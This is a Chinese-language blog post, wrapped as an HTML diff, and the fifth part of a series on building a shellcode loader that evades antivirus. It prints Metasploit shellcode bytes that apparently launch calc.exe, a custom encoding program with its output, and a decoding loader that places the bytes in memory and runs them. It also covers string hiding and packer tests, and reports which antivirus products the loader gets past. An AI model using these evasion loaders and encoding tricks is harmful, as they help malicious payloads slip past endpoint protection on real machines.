@@ -1,0 +1,292 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>从0开始写ShellCode加载器0x5-代码混淆 | Lucky Future的技术栈</title><meta name="keywords" content="android,安全,渗透测试,逆向"><meta name="author" content="LuckyFuture"><meta name="copyright" content="LuckyFuture"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="尝试了几种公开的代码混淆，软件壳方案，效果并不理想">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从0开始写ShellCode加载器0x5-代码混淆">
+<meta property="og:url" content="http://luckyfuture.top/BypassAVLearning5.html">
+<meta property="og:site_name" content="Lucky Future的技术栈">
+<meta property="og:description" content="尝试了几种公开的代码混淆，软件壳方案，效果并不理想">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220330225031462.png">
+<meta property="article:published_time" content="2022-03-30T14:47:51.000Z">
+<meta property="article:modified_time" content="2022-03-30T14:52:35.894Z">
+<meta property="article:author" content="LuckyFuture">
+<meta property="article:tag" content="android,安全,渗透测试,逆向">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220330225031462.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://luckyfuture.top/BypassAVLearning5"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?1347df1bbc1626b89dd2cc1d362b984c";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-978LXQR6H1"></script><script>window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-978LXQR6H1');
+</script><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isanchor: true
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}
+
+// https://stackoverflow.com/questions/16839698/jquery-getscript-alternative-in-native-javascript
+const getScript = url => new Promise((resolve, reject) => {
+  const script = document.createElement('script')
+  script.src = url
+  script.async = true
+  script.onerror = reject
+  script.onload = script.onreadystatechange = function() {
+    const loadState = this.readyState
+    if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+    script.onload = script.onreadystatechange = null
+    resolve()
+  }
+  document.head.appendChild(script)
+})</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-03-30 22:52:35'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}const fontSizeVal = saveToLocal.get('global-font-size')
+if (fontSizeVal !== undefined) {
+  document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
+}})()</script><meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/rss.xml" title="Lucky Future的技术栈" type="application/rss+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" data-lazy-src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 全部文章</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220330225031462.png)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Lucky Future的技术栈</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 全部文章</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">从0开始写ShellCode加载器0x5-代码混淆</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-03-30T14:47:51.000Z" title="发表于 2022-03-30 22:47:51">2022-03-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-03-30T14:52:35.894Z" title="更新于 2022-03-30 22:52:35">2022-03-30</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80/">木马免杀</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>9分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/BypassAVLearning5.html#post-comment"><span class="waline-comment-count" id="/BypassAVLearning5.html"></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>这是从0开始写ShellCode加载器的第5篇文章，文章列表，样本demo已上传到<a target="_blank" rel="noopener" href="https://github.com/luckyfuture0177/ReZeroBypassAV">GitHub</a></p>
+</blockquote>
+<blockquote>
+<p>尝试了几种公开的源码混淆，软件壳方案，效果并不理想。代码混淆这个点暂时搁置。</p>
+</blockquote>
+<p>免杀技术日新月异，然而除非有巧妙的思路出现，多数情况下只是和杀软标记的特征在做对抗。这个过程有点像绕WAF规则。我们先是将shellcode分离加载，又将导入表中敏感函数自定义，又将url地址采用命令行参数的方式传参给程序。上述这些行为的目的都是规避杀软的特征检测。</p>
+<h3 id="代码混淆"><a href="#代码混淆" class="headerlink" title="代码混淆"></a>代码混淆</h3><p>然而一般情况下，C/C++程序中的字符串常量会被硬编码到程序中（.data段，也就是数据段），尤其是全局变量最容易被定位到。使用strings命令查看</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220328204130128.png" alt="image-20220328204130128"></p>
+<p>程序中的函数名，字符串常量一览无遗。尽管我们隐藏了导入地址表，VirtualAlloc等字符串还是在里面的。那么对此有什么解决办法吗？在<a target="_blank" rel="noopener" href="https://payloads.online/archivers/2020-11-29/1/">倾旋的文章</a>中，将”VirtualAlloc”字符串base64编码后传入，调用时再将base64的密文隐式解密。这样程序中只有”VmlydHVhbEFsbG9j”之类的字符串，没有敏感函数名了。</p>
+<p>这是一个十分巧妙的方法，但不足之处是要在编写代码时考虑好加密解密的问题，如果能有自动化的工具帮助来完成这一过程就再好不过了。</p>
+<blockquote>
+<p>代码混淆(Obfuscated code)亦称花指令，是将计算机程序的代码，转换成一种功能上等价，但是难于阅读和理解的形式的行为。 代码混淆可以用于程序源代码，也可以用于程序编译而成的中间代码。 执行代码混淆的程序被称作代码混淆器。 已经存在许多种功能各异的代码混淆器。</p>
+</blockquote>
+<p>我想要一个在源码级的代码混淆工具，尝试了很多工具后没有找到满意的。代码混淆只是在静态上加强逆向的难度，对于程序的函数调用，行为等并没有混淆作用。这一块先暂时搁置，未来看一些OLLVM相关的知识。</p>
+<h3 id="shellcode混淆"><a href="#shellcode混淆" class="headerlink" title="shellcode混淆"></a>shellcode混淆</h3><p>使用msf生成的shellcode也是具有特征的，对shellcode进行处理可以消除特征。最基本的处理方式是异或加密，实现代码很简单。但经过查询资料，我发现异或操作本身也很敏感。于是我想到了自己写一个加密方式。</p>
+<p>首先我们来写对shellcode进行加密的程序。在分离免杀中，我已经将shellcode转换成了字符型数组。继续这个思路对数组进行加密。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\xe8\x82\x0\x0\x0\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\xc\x8b\x52\x14\x8b\x72\x28\xf\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x2\x2c\x20\xc1\xcf\xd\x1\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x1\xd1\x51\x8b\x59\x20\x1\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x1\xd6\x31\xff\xac\xc1\xcf\xd\x1\xc7\x38\xe0\x75\xf6\x3\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x1\xd3\x66\x8b\xc\x4b\x8b\x58\x1c\x1\xd3\x8b\x4\x8b\x1\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x1\x8d\x85\xb2\x0\x0\x0\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x6\x7c\xa\x80\xfb\xe0\x75\x5\xbb\x47\x13\x72\x6f\x6a\x0\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x0\x0&quot;</span>;</span><br><span class="line">	<span class="type">int</span> shellcode_size = <span class="keyword">sizeof</span>(buf);</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="keyword">sizeof</span>(buf) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; shellcode_size; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> code = buf[i];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>, buf[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; shellcode_size; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> code = buf[i];</span><br><span class="line">        <span class="keyword">if</span> (code == <span class="number">0</span>) <span class="comment">//如果为0，不做处理</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>, code);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (code % <span class="number">2</span> == <span class="number">0</span>)  <span class="comment">//如果为偶数 加1</span></span><br><span class="line">        &#123;</span><br><span class="line">            code++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (code % <span class="number">2</span> != <span class="number">0</span>) <span class="comment">//如果为奇数 乘2</span></span><br><span class="line">        &#123;</span><br><span class="line">            code = code * <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>, code);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">------加密前----------</span><br><span class="line">252,232,130,0,0,0,96,137,229,49,192,100,139,80,48,139,82,12,139,82,20,139,114,40,15,183,74,38,49,255,172,60,97,124,2,44,32,193,207,13,1,199,226,242,82,87,139,82,16,139,74,60,139,76,17,120,227,72,1,209,81,139,89,32,1,211,139,73,24,227,58,73,139,52,139,1,214,49,255,172,193,207,13,1,199,56,224,117,246,3,125,248,59,125,36,117,228,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4,139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,95,95,90,139,18,235,141,93,106,1,141,133,178,0,0,0,80,104,49,139,111,135,255,213,187,240,181,162,86,104,166,149,189,157,255,213,60,6,124,10,128,251,224,117,5,187,71,19,114,111,106,0,83,255,213,99,97,108,99,46,101,120,101,0,0,0</span><br><span class="line">----------加密后-----</span><br><span class="line">253,233,131,0,0,0,97,274,458,98,193,101,278,81,49,278,83,13,278,83,21,278,115,41,30,366,75,39,98,510,173,61,194,125,3,45,33,386,414,26,2,398,227,243,83,174,278,83,17,278,75,61,278,77,34,121,454,73,2,418,162,278,178,33,2,422,278,146,25,454,59,146,278,53,278,2,215,98,510,173,386,414,26,2,398,57,225,234,247,6,250,249,118,250,37,234,229,89,278,89,37,2,422,103,278,13,150,278,89,29,2,422,278,5,278,2,209,274,69,37,37,182,182,194,178,91,162,510,225,190,190,91,278,19,470,282,186,107,2,282,266,179,0,0,0,81,105,98,278,222,270,510,426,374,241,362,163,87,105,167,298,378,314,510,426,61,7,125,11,129,502,225,234,10,374,142,38,115,222,107,0,166,510,426,198,194,109,198,47,202,121,202,0,0,0</span><br></pre></td></tr></table></figure>
+
+<p>把加密后的数组拿出来，再写一个解密加载程序</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a[] = &#123; <span class="number">253</span>,<span class="number">233</span>,<span class="number">131</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">97</span>,<span class="number">274</span>,<span class="number">458</span>,<span class="number">98</span>,<span class="number">193</span>,<span class="number">101</span>,<span class="number">278</span>,<span class="number">81</span>,<span class="number">49</span>,<span class="number">278</span>,<span class="number">83</span>,<span class="number">13</span>,<span class="number">278</span>,<span class="number">83</span>,<span class="number">21</span>,<span class="number">278</span>,<span class="number">115</span>,<span class="number">41</span>,<span class="number">30</span>,<span class="number">366</span>,<span class="number">75</span>,<span class="number">39</span>,<span class="number">98</span>,<span class="number">510</span>,<span class="number">173</span>,<span class="number">61</span>,<span class="number">194</span>,<span class="number">125</span>,<span class="number">3</span>,<span class="number">45</span>,<span class="number">33</span>,<span class="number">386</span>,<span class="number">414</span>,<span class="number">26</span>,<span class="number">2</span>,<span class="number">398</span>,<span class="number">227</span>,<span class="number">243</span>,<span class="number">83</span>,<span class="number">174</span>,<span class="number">278</span>,<span class="number">83</span>,<span class="number">17</span>,<span class="number">278</span>,<span class="number">75</span>,<span class="number">61</span>,<span class="number">278</span>,<span class="number">77</span>,<span class="number">34</span>,<span class="number">121</span>,<span class="number">454</span>,<span class="number">73</span>,<span class="number">2</span>,<span class="number">418</span>,<span class="number">162</span>,<span class="number">278</span>,<span class="number">178</span>,<span class="number">33</span>,<span class="number">2</span>,<span class="number">422</span>,<span class="number">278</span>,<span class="number">146</span>,<span class="number">25</span>,<span class="number">454</span>,<span class="number">59</span>,<span class="number">146</span>,<span class="number">278</span>,<span class="number">53</span>,<span class="number">278</span>,<span class="number">2</span>,<span class="number">215</span>,<span class="number">98</span>,<span class="number">510</span>,<span class="number">173</span>,<span class="number">386</span>,<span class="number">414</span>,<span class="number">26</span>,<span class="number">2</span>,<span class="number">398</span>,<span class="number">57</span>,<span class="number">225</span>,<span class="number">234</span>,<span class="number">247</span>,<span class="number">6</span>,<span class="number">250</span>,<span class="number">249</span>,<span class="number">118</span>,<span class="number">250</span>,<span class="number">37</span>,<span class="number">234</span>,<span class="number">229</span>,<span class="number">89</span>,<span class="number">278</span>,<span class="number">89</span>,<span class="number">37</span>,<span class="number">2</span>,<span class="number">422</span>,<span class="number">103</span>,<span class="number">278</span>,<span class="number">13</span>,<span class="number">150</span>,<span class="number">278</span>,<span class="number">89</span>,<span class="number">29</span>,<span class="number">2</span>,<span class="number">422</span>,<span class="number">278</span>,<span class="number">5</span>,<span class="number">278</span>,<span class="number">2</span>,<span class="number">209</span>,<span class="number">274</span>,<span class="number">69</span>,<span class="number">37</span>,<span class="number">37</span>,<span class="number">182</span>,<span class="number">182</span>,<span class="number">194</span>,<span class="number">178</span>,<span class="number">91</span>,<span class="number">162</span>,<span class="number">510</span>,<span class="number">225</span>,<span class="number">190</span>,<span class="number">190</span>,<span class="number">91</span>,<span class="number">278</span>,<span class="number">19</span>,<span class="number">470</span>,<span class="number">282</span>,<span class="number">186</span>,<span class="number">107</span>,<span class="number">2</span>,<span class="number">282</span>,<span class="number">266</span>,<span class="number">179</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">81</span>,<span class="number">105</span>,<span class="number">98</span>,<span class="number">278</span>,<span class="number">222</span>,<span class="number">270</span>,<span class="number">510</span>,<span class="number">426</span>,<span class="number">374</span>,<span class="number">241</span>,<span class="number">362</span>,<span class="number">163</span>,<span class="number">87</span>,<span class="number">105</span>,<span class="number">167</span>,<span class="number">298</span>,<span class="number">378</span>,<span class="number">314</span>,<span class="number">510</span>,<span class="number">426</span>,<span class="number">61</span>,<span class="number">7</span>,<span class="number">125</span>,<span class="number">11</span>,<span class="number">129</span>,<span class="number">502</span>,<span class="number">225</span>,<span class="number">234</span>,<span class="number">10</span>,<span class="number">374</span>,<span class="number">142</span>,<span class="number">38</span>,<span class="number">115</span>,<span class="number">222</span>,<span class="number">107</span>,<span class="number">0</span>,<span class="number">166</span>,<span class="number">510</span>,<span class="number">426</span>,<span class="number">198</span>,<span class="number">194</span>,<span class="number">109</span>,<span class="number">198</span>,<span class="number">47</span>,<span class="number">202</span>,<span class="number">121</span>,<span class="number">202</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> shellcode_size1 = <span class="keyword">sizeof</span>(a) / <span class="keyword">sizeof</span>(a[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;size of a:&quot;</span> &lt;&lt; shellcode_size1 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; shellcode_size1; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>, a[i]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (a[i] == <span class="number">0</span>) <span class="comment">//如果为0，不做处理</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (a[i] % <span class="number">2</span> == <span class="number">0</span>)  <span class="comment">//如果为偶数 除2</span></span><br><span class="line">        &#123;</span><br><span class="line">            a[i] = a[i] / <span class="number">2</span>;       <span class="comment">//写回</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (a[i] % <span class="number">2</span> != <span class="number">0</span>) <span class="comment">//如果为奇数 减1</span></span><br><span class="line">        &#123;</span><br><span class="line">            a[i] = a[i] - <span class="number">1</span>;    <span class="comment">//写回</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* b = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="built_in">malloc</span>(shellcode_size1);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = shellcode_size1<span class="number">-1</span>; i &gt;=<span class="number">0</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        b[i] = <span class="type">char</span>(a[i]);  <span class="comment">//倒着写入，万一有效呢</span></span><br><span class="line">    &#125;</span><br><span class="line">    load(b, shellcode_size1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>测试一下效果，轻松过360，被defender乱杀</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220330153316723.png" alt="image-20220330153316723"></p>
+<h3 id="软件加壳"><a href="#软件加壳" class="headerlink" title="软件加壳"></a>软件加壳</h3><p>除了源码级的混淆之外，还有另一种减少特征的方法。杀软检测的编译好的exe文件，一般情况下是不会对照源码进行特征标记的，mimikatz那种著名程序除外。exe中的字符主要是存储在.data段中，如果我们先将.data段中的数据加密，运行时再解密，那么杀软静态面对的是加密后的数据，无法检测特征。</p>
+<p>这个过程其实就是软件加壳的过程，市面有很多加壳工具，比如著名的UPXshell。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220329095148450.png" alt="image-20220329095148450"></p>
+<p>重新检测加壳后的程序，函数名和字符串都没有了，我们自定义的函数没有了，而且文件体积减小了。并且能正常运行。效果可以说非常好。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220329095259717.png" alt="image-20220329095259717"></p>
+<p>然而，UPXshell特征也被杀软标记了，原本杀软不报毒的程序，加壳后反而报毒。同样的还有VMP壳，也被杀软标记，敢加就敢杀。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220329095559570.png" alt="image-20220329095559570"></p>
+<p>软件加壳算是复杂技术，免费可用很少，github上直接可以拿来用的也大多数被杀毒软件标记了。</p>
